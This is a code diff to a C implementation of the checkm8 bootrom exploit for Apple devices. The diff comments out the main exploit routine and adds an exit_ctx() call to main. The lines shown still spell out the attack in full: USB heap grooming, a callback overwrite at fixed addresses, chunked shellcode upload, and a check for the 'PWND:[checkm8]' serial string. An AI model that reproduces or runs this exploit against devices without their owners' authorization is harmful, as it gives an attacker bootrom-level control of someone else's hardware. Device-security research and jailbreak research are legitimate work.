@@ -79,71 +79,71 @@ int exploit() {
         0x30 uint64_t + 0x10 pad bytes + 0x1C0 callback data + 0x600 pad bytes + 0x400 shellcode 
     */
 
-    v64 addrs = v64_new(6);
-    v64_push(&addrs, 0x180020400-8);
-    v64_push(&addrs, 0x1000006A5);
-    v64_push(&addrs, 0x180020600-8);
-    v64_push(&addrs, 0x180000625);
-    v64_push(&addrs, 0x18000C600-8);
-    v64_push(&addrs, 0x180000625);
-    // TODO: free(addrs);
+    // v64 addrs = v64_new(6);
+    // v64_push(&addrs, 0x180020400-8);
+    // v64_push(&addrs, 0x1000006A5);
+    // v64_push(&addrs, 0x180020600-8);
+    // v64_push(&addrs, 0x180000625);
+    // v64_push(&addrs, 0x18000C600-8);
+    // v64_push(&addrs, 0x180000625);
+    // // TODO: free(addrs);
 
-    // Aligning final shellcode we will transfer to device
-    v8_append(&final_shellcode, v64_convert_v8(addrs)); // 6Q    (0x30)
-    v8_append(&final_shellcode, v8_zeros(0x10));        // 16x   (0x10)
-    v8_append(&final_shellcode, callback_data);         // 448s  (0x1C0)
-    v8_append(&final_shellcode, v8_zeros(0x600));       // 1536x (0x600)
-    v8_append(&final_shellcode, shellcode);             // 1024s (0x400)
+    // // Aligning final shellcode we will transfer to device
+    // v8_append(&final_shellcode, v64_convert_v8(addrs)); // 6Q    (0x30)
+    // v8_append(&final_shellcode, v8_zeros(0x10));        // 16x   (0x10)
+    // v8_append(&final_shellcode, callback_data);         // 448s  (0x1C0)
+    // v8_append(&final_shellcode, v8_zeros(0x600));       // 1536x (0x600)
+    // v8_append(&final_shellcode, shellcode);             // 1024s (0x400)
 
     // DEBUG
-    printf("\tmain:\n\t\tfinal_shellcode.size: 0x%03x\n", final_shellcode.size);
+    // printf("\tmain:\n\t\tfinal_shellcode.size: 0x%03x\n", final_shellcode.size);
 
-    v8 overwrite = create_overwrite(0x10000A9C4, 0x18001C020);
+    // v8 overwrite = create_overwrite(0x10000A9C4, 0x18001C020);
 
-    aquire_device();
+    // aquire_device();
 
-    printf("[x]\tStage1: Heap feng-shui...\n");    
+    // printf("[x]\tStage1: Heap feng-shui...\n");    
 
     // t8015: large_leak=None, hole=6, leak=1
-    stall();
-    for (int i = 0; i < 6; i++) {
-        no_leak();
-    }
-    usb_req_leak();
-    no_leak();
+    // stall();
+    // for (int i = 0; i < 6; i++) {
+    //     no_leak();
+    // }
+    // usb_req_leak();
+    // no_leak();
 
-    reset_device();
-    release_device();
+    // reset_device();
+    // release_device();
 
-    printf("[x]\tStage2: Reopening device without clearing global vars...\n");
-    aquire_device();
-    async_ctrl_transfer(0x21, 1, 0, 0, a800, 0.0001);
-    no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
-    release_device();
+    // printf("[x]\tStage2: Reopening device without clearing global vars...\n");
+    // aquire_device();
+    // async_ctrl_transfer(0x21, 1, 0, 0, a800, 0.0001);
+    // no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
+    // release_device();
 
-    sleep_ms(500);
+    // sleep_ms(500);
 
-    printf("[x]\tStage3: Exploiting...\n");
+    // printf("[x]\tStage3: Exploiting...\n");
     
-    aquire_device();
-    usb_req_stall();
-    usb_req_leak();
-    no_error_ctrl_transfer(0, 0, 0, 0, overwrite.data, overwrite.size, 100);
-    for (int i = 0; i < final_shellcode.size; i += 0x800) {
-        uint8_t* data_chunk = malloc(0x800);
-        memcpy(data_chunk, &final_shellcode.data[i], 0x800);
-        async_ctrl_transfer(0x21, 1, 0, 0, data_chunk, 100);
-        free(data_chunk);
-    }
+    // aquire_device();
+    // usb_req_stall();
+    // usb_req_leak();
+    // no_error_ctrl_transfer(0, 0, 0, 0, overwrite.data, overwrite.size, 100);
+    // for (int i = 0; i < final_shellcode.size; i += 0x800) {
+    //     uint8_t* data_chunk = malloc(0x800);
+    //     memcpy(data_chunk, &final_shellcode.data[i], 0x800);
+    //     async_ctrl_transfer(0x21, 1, 0, 0, data_chunk, 100);
+    //     free(data_chunk);
+    // }
 
-    reset_device();
-    release_device();
-    aquire_device();
+    // reset_device();
+    // release_device();
+    // aquire_device();
 
-    if(strstr(get_serial_string(), "PWND:[checkm8]") == NULL) {
-        printf("Exploit failed");
-        exit(EXIT_FAILURE);
-    }
+    // if(strstr(get_serial_string(), "PWND:[checkm8]") == NULL) {
+    //     printf("Exploit failed");
+    //     exit(EXIT_FAILURE);
+    // }
 
     return status;
 }
@@ -171,6 +171,6 @@ int main(int argc, char const *argv[])
             }
         }
     }
-
+    exit_ctx();
     return status;
 }
